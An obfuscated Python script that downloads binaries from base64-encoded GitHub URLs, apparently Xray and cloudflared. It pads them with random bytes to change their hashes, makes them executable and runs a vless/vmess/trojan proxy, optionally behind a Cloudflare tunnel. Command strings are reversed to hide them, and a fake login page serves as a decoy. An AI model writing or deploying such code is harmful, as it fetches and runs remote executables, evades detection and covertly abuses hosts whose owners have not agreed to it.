import ast
import base64
import glob
import io
import zipfile
from os.path import join
import random
import urllib.request
from http.server import BaseHTTPRequestHandler, HTTPServer, SimpleHTTPRequestHandler, ThreadingHTTPServer
import json
import os.path
import re
import subprocess
import sys as ysy
import threading
import time
import urllib

_p_i_d = set()
_s_m_a_p_s = dict()
_c_w_d = os.getcwd()
_h_o_s = ""
_0_0_1 = "001"
_0_0_2 = "002"
_i_n_d = "aHR0cHM6Ly9naXRodWIuY29tL2Zlcm9oMS9jbG91ZGZsYXJlZC9yYXcvbWFpbi9hYmMyLnppcA=="
_c_f_d = "aHR0cHM6Ly9naXRodWIuY29tL2Zlcm9oMS9jbG91ZGZsYXJlZC9yYXcvbWFpbi9jbG91ZGZsYXJlZC1saW51eC1hbWQ2NC56aXA="
_u_a_c = "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/113.0"
_p_i_d_1 = random.randint(10000, 65535)
while _p_i_d_1 in _p_i_d: _p_i_d_1 = random.randint(10000, 65535)
_p_i_d.add(_p_i_d_1)
_p_i_d_2 = random.randint(10000, 65535)
while _p_i_d_2 in _p_i_d: _p_i_d_2 = random.randint(10000, 65535)
_p_i_d.add(_p_i_d_2)
_p_i_d_3 = random.randint(10000, 65535)
while _p_i_d_3 in _p_i_d: _p_i_d_3 = random.randint(10000, 65535)
_p_i_d.add(_p_i_d_3)
_p_i_d_4 = random.randint(10000, 65535)
while _p_i_d_4 in _p_i_d: _p_i_d_4 = random.randint(10000, 65535)
_p_i_d.add(_p_i_d_4)
_e_c_f = False
_s_e_1 = 8080
_u_i_d = "878ec96b-16ea-4519-a364-18998da0c39c"
_v_l_s = ""
_v_m_s = ""
_t_r_s = ""
_i_n_d = base64.b64decode(_i_n_d.encode("utf8")).decode("utf8")
_c_f_d = base64.b64decode(_c_f_d.encode("utf8")).decode("utf8")
_h_a_s = ("eydpbmJvdW5kcyc6IFt7J3BvcnQnOiAwLCAncHJvdG9jb2wnOiAndmxlc3MnLCAnc2V0dGluZ3MnOiB7J2NsaWVudHMnOiBbeydpZCc6IC"
          "cnLCAnZmxvdyc6ICd4dGxzLXJwcngtZGlyZWN0J31dLCAnZGVjcnlwdGlvbic6ICdub25lJywgJ2ZhbGxiYWNrcyc6IFt7J3BhdGgnOi"
          "AnJywgJ2Rlc3QnOiAwfSwgeydwYXRoJzogJycsICdkZXN0JzogMH0sIHsncGF0aCc6ICcnLCAnZGVzdCc6IDB9LCB7J2Rlc3QnOiAwfV"
          "19LCAnc3RyZWFtU2V0dGluZ3MnOiB7J25ldHdvcmsnOiAndGNwJ30sICdsaXN0ZW4nOiAnMC4wLjAuMCd9LCB7J3BvcnQnOiAwLCAnbG"
          "lzdGVuJzogJzEyNy4wLjAuMScsICdwcm90b2NvbCc6ICd2bGVzcycsICdzZXR0aW5ncyc6IHsnY2xpZW50cyc6IFt7J2lkJzogJyd9XS"
          "wgJ2RlY3J5cHRpb24nOiAnbm9uZSd9LCAnc3RyZWFtU2V0dGluZ3MnOiB7J25ldHdvcmsnOiAnd3MnLCAnd3NTZXR0aW5ncyc6IHsnc"
          "GF0aCc6ICcnfX19LCB7J3BvcnQnOiAwLCAnbGlzdGVuJzogJzEyNy4wLjAuMScsICdwcm90b2NvbCc6ICd2bWVzcycsICdzZXR0aW5n"
          "cyc6IHsnY2xpZW50cyc6IFt7J2lkJzogJyd9XX0sICdzdHJlYW1TZXR0aW5ncyc6IHsnbmV0d29yayc6ICd3cycsICdzZWN1cml0eSc"
          "6ICdub25lJywgJ3dzU2V0dGluZ3MnOiB7J3BhdGgnOiAnJ319fSwgeydwb3J0JzogMCwgJ2xpc3Rlbic6ICcxMjcuMC4wLjEnLCAncHJvd"
          "G9jb2wnOiAndHJvamFuJywgJ3NldHRpbmdzJzogeydjbGllbnRzJzogW3sncGFzc3dvcmQnOiAnJ31dfSwgJ3N0cmVhbVNldHRpbmdzJ"
          "zogeyduZXR3b3JrJzogJ3dzJywgJ3NlY3VyaXR5JzogJ25vbmUnLCAnd3NTZXR0aW5ncyc6IHsncGF0aCc6ICcnfX19XSwgJ3JvdXRpbm"
          "cnOiB7J2RvbWFpblN0cmF0ZWd5JzogJ0lQSWZOb25NYXRjaCcsICdydWxlcyc6IFt7J3R5cGUnOiAnZmllbGQnLCAncG9ydCc6ICcwLT"
          "Y1NTM1JywgJ291dGJvdW5kVGFnJzogJ2RpcmVjdCcsICdlbmFibGVkJzogVHJ1ZX1dfSwnbG9nJzogeydsb2dsZXZlbCc6ICdub25lJ30s"
          "ICdvdXRib3VuZHMnOiBbeydwcm90b2NvbCc6ICdmcmVlZG9tJywgJ3RhZyc6ICdkaXJlY3QnfV0sfQ==")
if len(_v_l_s) == 0: _v_l_s = "/" + _u_i_d[0:8] + "_" + _u_i_d[9:13]
if len(_v_m_s) == 0: _v_m_s = "/" + _u_i_d[0:8] + "_" + _u_i_d[14:18]
if len(_t_r_s) == 0: _t_r_s = "/" + _u_i_d[0:8] + "_" + _u_i_d[19:23]
_f_x_1 = [i for i in os.listdir() if i.endswith(_0_0_1) and os.path.isfile(i) and os.path.getsize(i) > 0x1f4000]
_f_c_1 = os.path.join(os.getcwd(),
                      ".1"[0].join(["".join([str(i) for i in _p_i_d])[0: random.randint(1, 11)], _0_0_1]) if len(
                          _f_x_1) == 0 else _f_x_1[0])
_f_x_2 = [i for i in os.listdir() if i.endswith(_0_0_2) and os.path.isfile(i) and os.path.getsize(i) > 0x1f4000]
_f_c_2 = os.path.join(os.getcwd(),
                      ".2"[0].join(["".join([str(i) for i in _p_i_d])[0: random.randint(1, 11)], _0_0_2]) if len(
                          _f_x_2) == 0 else _f_x_2[0])
_s_m_a_p_s.update({
    "aW5ib3VuZHMuMC5saXN0ZW4=": ".".join(["0", "0", "0", "0"]),
    "aW5ib3VuZHMuMC5wb3J0": _s_e_1,
    "aW5ib3VuZHMuMC5zZXR0aW5ncy5jbGllbnRzLjAuaWQ=": _u_i_d,
    "aW5ib3VuZHMuMC5zZXR0aW5ncy5mYWxsYmFja3MuMC5wYXRo": _v_l_s,
    "aW5ib3VuZHMuMC5zZXR0aW5ncy5mYWxsYmFja3MuMC5kZXN0": _p_i_d_1,
    "aW5ib3VuZHMuMC5zZXR0aW5ncy5mYWxsYmFja3MuMS5wYXRo": _v_m_s,
    "aW5ib3VuZHMuMC5zZXR0aW5ncy5mYWxsYmFja3MuMS5kZXN0": _p_i_d_2,
    "aW5ib3VuZHMuMC5zZXR0aW5ncy5mYWxsYmFja3MuMi5wYXRo": _t_r_s,
    "aW5ib3VuZHMuMC5zZXR0aW5ncy5mYWxsYmFja3MuMi5kZXN0": _p_i_d_3,
    "aW5ib3VuZHMuMC5zZXR0aW5ncy5mYWxsYmFja3MuMy5kZXN0": _p_i_d_4,
    "aW5ib3VuZHMuMS5wb3J0": _p_i_d_1,
    "aW5ib3VuZHMuMS5zZXR0aW5ncy5jbGllbnRzLjAuaWQ=": _u_i_d,
    "aW5ib3VuZHMuMS5zdHJlYW1TZXR0aW5ncy53c1NldHRpbmdzLnBhdGg=": _v_l_s,
    "aW5ib3VuZHMuMi5wb3J0": _p_i_d_2,
    "aW5ib3VuZHMuMi5zZXR0aW5ncy5jbGllbnRzLjAuaWQ=": _u_i_d,
    "aW5ib3VuZHMuMi5zdHJlYW1TZXR0aW5ncy53c1NldHRpbmdzLnBhdGg=": _v_m_s,
    "aW5ib3VuZHMuMy5wb3J0": _p_i_d_3,
    "aW5ib3VuZHMuMy5zZXR0aW5ncy5jbGllbnRzLjAucGFzc3dvcmQ=": _u_i_d,
    "aW5ib3VuZHMuMy5zdHJlYW1TZXR0aW5ncy53c1NldHRpbmdzLnBhdGg=": _t_r_s,
})
_d_h_a = ast.literal_eval(base64.b64decode(_h_a_s.encode("utf8")).decode("utf8"))
for k, v in _s_m_a_p_s.items():
    k = base64.b64decode(k.encode("utf8")).decode("utf8")
    _map = _d_h_a
    _kk = k.split(".")
    for jk in _kk[:-1]:
        if jk.isdigit():
            _map = _map[int(jk)]
        else:
            _map = _map[jk]
    else:
        _map[_kk[-1]] = v


def _f_c_h(_b_a_i, _u_r_a, _p_a_t):
    if os.path.isfile(_b_a_i): return
    _file = glob.glob(join(_c_w_d, f"*.zip"))
    if len(_file) > 0:
        for _file in _file[:]:
            try:
                with zipfile.ZipFile(_file) as z:
                    for i in z.namelist():
                        if not re.search(_p_a_t, i): continue
                        with open(_b_a_i, 'wb') as c:
                            c.write(z.read(i))
                            c.write(b"\0" * random.randint(0x0, 0x201000 * 2))
                            break
            except Exception as e:
                print(str(e))
                os.remove(_file)
            else:
                os.remove(_file)
    else:
        with open(join(
                _c_w_d, ".".join((os.path.splitext(_b_a_i)[0], "zip"))), "wb") as _f:
            headers = {
                "Accept": 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
                "Accept-Encoding": 'gzip, deflate, br',
                'Connection': 'keep-alive',
                "Accept-Language": 'en-US,en;q=0.5',
                'User-Agent': _u_a_c,
            }
            timeout = random.uniform(6, 10)
            req = urllib.request.Request(_u_r_a, headers=headers)
            response = urllib.request.urlopen(req, timeout=timeout)
            content = response.read()
            response.close()
            _f.write(content)
    _f_c_h(_b_a_i, _u_r_a, _p_a_t)


def _r_c_f():
    global _h_o_s
    while True:
        _s_p_p = subprocess.Popen([_f_c_2, "lennut"[::-1], "lru--"[::-1], ":1.0.0.721//:ptth"[::-1] + str(_s_e_1),
                                   "etadpuotua-on--"[::-1], ], stderr=subprocess.STDOUT, stdout=subprocess.PIPE, )
        while _s_p_p.poll() is None:
            _d_s_x = _s_p_p.stdout.readline().decode("utf8")
            _r_e_o = re.search(r"://([\w\-]{10,}\.trycloudflare\.com)", _d_s_x)
            if _r_e_o: _h_o_s = _r_e_o.group(1)
        time.sleep(10)


def _r_x_y():
    global _h_o_s
    while True:
        subprocess.run([_f_c_1, "nur"[::-1], ],
                       stderr=subprocess.DEVNULL, stdout=subprocess.DEVNULL,
                       input=json.dumps(_d_h_a, ).encode('utf8'))
        time.sleep(10)


class MyRequestHandler(SimpleHTTPRequestHandler):
    server_version = ''
    sys_version = ''

    def log_message(self, format, *args):
        pass

    def do_GET(self):
        self.send_response(200)
        self.send_header('Content-type', 'text/html')
        self.end_headers()
        if self.path == "/cfd":
            self.wfile.write(f"""<!DOCTYPE html><html lang="en">
<head><meta charset="UTF-8"><title>Title</title>
</head><body><h4>{_h_o_s if _e_c_f else "not enabled."}</h4></body></html>""".encode("utf8"))
        else:
            self.wfile.write(r"""<!DOCTYPE html><html lang="en"><head>
    <meta http-equiv="content-type" content="text/html; charset=UTF-8">
    <meta charset="UTF-8">
    <title>Login</title>
    <style>
        @import url(https://fonts.googleapis.com/css?family=Roboto:300);
        .login-page {
          width: 360px;
          padding: 8% 0 0;
          margin: auto;
        }
        .form {
          position: relative;
          z-index: 1;
          background: #FFFFFF;
          max-width: 360px;
          margin: 0 auto 100px;
          padding: 45px;
          text-align: center;
          box-shadow: 0 0 20px 0 rgba(0, 0, 0, 0.2), 0 5px 5px 0 rgba(0, 0, 0, 0.24);
        }
        .form input {
          font-family: "Roboto", sans-serif;
          outline: 0;
          background: #f2f2f2;
          width: 100%;
          border: 0;
          margin: 0 0 15px;
          padding: 15px;
          box-sizing: border-box;
          font-size: 14px;
        }
        .form button {
          font-family: "Roboto", sans-serif;
          text-transform: uppercase;
          outline: 0;
          background: #4CAF50;
          width: 100%;
          border: 0;
          padding: 15px;
          color: #FFFFFF;
          font-size: 14px;
          -webkit-transition: all 0.3 ease;
          transition: all 0.3 ease;
          cursor: pointer;
        }
        .form button:hover,.form button:active,.form button:focus {
          background: #43A047;
        }
        .form .message {
          margin: 15px 0 0;
          color: #b3b3b3;
          font-size: 12px;
        }
        .form .message a {
          color: #4CAF50;
          text-decoration: none;
        }
        .form .register-form {
          display: none;
        }
        .container {
          position: relative;
          z-index: 1;
          max-width: 300px;
          margin: 0 auto;
        }
        .container:before, .container:after {
          content: "";
          display: block;
          clear: both;
        }
        .container .info {
          margin: 50px auto;
          text-align: center;
        }
        .container .info h1 {
          margin: 0 0 15px;
          padding: 0;
          font-size: 36px;
          font-weight: 300;
          color: #1a1a1a;
        }
        .container .info span {
          color: #4d4d4d;
          font-size: 12px;
        }
        .container .info span a {
          color: #000000;
          text-decoration: none;
        }
        .container .info span .fa {
          color: #EF3B3A;
        }
        body {
          background: #76b852; /* fallback for old browsers */
          background: rgb(141,194,111);
          background: linear-gradient(90deg, rgba(141,194,111,1) 0%, rgba(118,184,82,1) 50%);
          font-family: "Roboto", sans-serif;
          -webkit-font-smoothing: antialiased;
          -moz-osx-font-smoothing: grayscale;
        }
    </style>
    <script>
        $('.message a').click(function(){
           $('form').animate({height: "toggle", opacity: "toggle"}, "slow");
        });
    </script>
</head><body><div class="login-page">
    <div class="form">
        <form class="login-form">
            <input type="text" placeholder="username">
            <input type="password" placeholder="password">
            <button>login</button>
            <p class="message"><a href="#"></a></p>
        </form>
    </div></div></body></html>""".encode("utf8"))
        return SimpleHTTPRequestHandler


def _s_s_r():
    httpd = HTTPServer(('127.0.0.1', _p_i_d_4), MyRequestHandler)
    httpd.serve_forever()


_f_c_h(_f_c_1, _i_n_d, r"^[X0x1]{1,}[R1r2]{1,}[A2a3]{1,}[Y3y4]{1,}")
if "cf" in ysy.argv or _e_c_f:
    _f_c_h(_f_c_2, _c_f_d, r"^[Cc]{1,}[Ll]{1,}[Oo]{1,}[Uu]{1,}[Dd]{1,}")
try:
    os.chmod(_f_c_1, 0o777, )
    os.chmod(_f_c_2, 0o777, )
except Exception as e:
    pass
if "init" in ysy.argv: ysy.exit(0)
threading.Thread(target=_s_s_r, daemon=True).start()
if "cf" in ysy.argv or _e_c_f:
    threading.Thread(target=_r_c_f, daemon=True).start()
threading.Thread(target=_r_x_y, daemon=True).start()
while True: time.sleep(1)
exit(0)
